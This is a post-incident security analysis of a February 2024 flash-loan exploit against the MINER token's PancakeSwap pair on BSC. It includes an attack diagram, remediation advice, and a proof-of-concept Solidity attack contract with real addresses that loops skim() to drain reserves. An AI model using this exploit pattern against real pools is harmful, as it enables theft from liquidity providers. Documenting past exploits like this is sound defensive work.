# MINER (BSC) — Flash Loan-Based Repeated skim Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | MINER (BSC) |
| **Chain** | BSC |
| **Loss** | ~3.5 WBNB |
| **Attacker** | [0x031958a8](https://bscscan.com/address/0x031958a8137745350549fd95055398dd536a07c7) |
| **Attack Contract** | [0xc9716ec1](https://bscscan.com/address/0xc9716ec1b0503316233e3bcc50853f0df6befd43) |
| **Vulnerable Contract** | [Pair 0x2ba9d4a8](https://bscscan.com/address/0x2ba9d4a8c41c60b71ff7df2c3f54b008644b954e) |
| **MINER Token** | [0x7C0BFb9f](https://bscscan.com/address/0x7C0BFb9fF0aF660D76fb2bd8865E9b49ff033045) |
| **DODO Flash Loan** | [0x81917eb9](https://bscscan.com/address/0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d) |
| **Root Cause** | Attacker transferred MINER tokens to the pair and repeatedly called `skim()` 50 times to extract tokens in excess of reserves, then recovered WBNB via a final `swap()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/MINER_bsc_exp.sol) |

---

## 1. Vulnerability Overview

The MINER token pair on BSC is vulnerable to repeated `skim()` calls. The attacker borrowed 10 WBNB via a DODO flash loan, swapped it for MINER, transferred MINER to the pair contract, and repeatedly called `skim()` 50 times to continuously extract excess MINER beyond the reserves. Finally, the accumulated value was recovered as WBNB via a `swap()` call.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: unlimited token extraction via repeated skim() calls
interface IPancakePair {
    function skim(address to) external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

// skim(): transfers balance - reserve amount to the `to` address
// When the MINER token has a tax/rebase mechanism,
// a state where balance > reserve is repeatedly created after each token transfer

// ✅ Safe code: restrict skim call frequency or track balances internally
uint256 private lastSkimBlock;

function skim(address to) external {
    require(block.number > lastSkimBlock + SKIM_COOLDOWN, "skim too frequent");
    lastSkimBlock = block.number;
    // ... standard skim logic
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: MINER_decompiled.sol
contract MINER {
    function skim(address p0) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO Flash Loan: Borrow 10 WBNB
  │
  ├─→ [2] PancakeSwap: Swap WBNB → MINER
  │
  ├─→ [3] Transfer MINER tokens to the pair contract
  │
  ├─→ [4] Call skim() 50 times in a loop
  │         └─ Each call extracts the balance-reserve difference in MINER
  │
  ├─→ [5] Transfer accumulated MINER to the pair and call swap()
  │         └─ Recover ~3.5 WBNB
  │
  └─→ [6] Repay DODO: 10 WBNB + fees
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IPancakePair {
    function skim(address to) external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract AttackContract {
    IPancakePair constant pair   = IPancakePair(0x2ba9d4a8c41c60b71ff7df2c3f54b008644b954e);
    IERC20       constant MINER  = IERC20(0x7C0BFb9fF0aF660D76fb2bd8865E9b49ff033045);
    IERC20       constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDODO        constant dodo   = IDODO(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    function testExploit() external {
        dodo.flashLoan(10 ether, 0, address(this), "");
    }

    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // [1] Swap WBNB → MINER
        swapWBNBToMINER(10 ether);

        // [2] Transfer MINER to pair and repeatedly call skim
        uint256 minerBal = MINER.balanceOf(address(this));
        MINER.transfer(address(pair), minerBal);

        for (uint i = 0; i < 50; i++) {
            pair.skim(address(this));  // Extract balance - reserve
            // Transfer extracted MINER back to the pair
            MINER.transfer(address(pair), MINER.balanceOf(address(this)));
        }

        // [3] Recover WBNB via final swap
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint amountOut = calculateAmountOut(MINER.balanceOf(address(pair)) - r0, r1);
        pair.swap(0, amountOut, address(this), "");

        // [4] Repay flash loan
        WBNB.transfer(address(dodo), 10 ether);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reserve manipulation via repeated skim calls |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (flash loan + standard DEX skim function) |
| **DApp Category** | Tax/rebase token + PancakeSwap pair |
| **Impact** | WBNB theft through pair reserve depletion |

## 6. Remediation Recommendations

1. **skim Cooldown**: Restrict duplicate `skim()` calls within the same block
2. **Tax Token Pair Validation**: Tokens with tax mechanisms require dedicated protection logic
3. **Internal Reserve Management**: Track reserves using internal variables rather than `balanceOf()`
4. **skim Access Control**: Restrict `skim()` calls to specific whitelisted addresses only

## 7. Lessons Learned

- Repeated `skim()` calls can progressively drain the reserves of tax token pairs.
- Tax tokens on BSC change balances on every transfer, causing frequent compatibility issues with standard AMMs.
- Even a small-scale attack (3.5 WBNB) becomes devastating when the same pattern is applied to larger liquidity pools.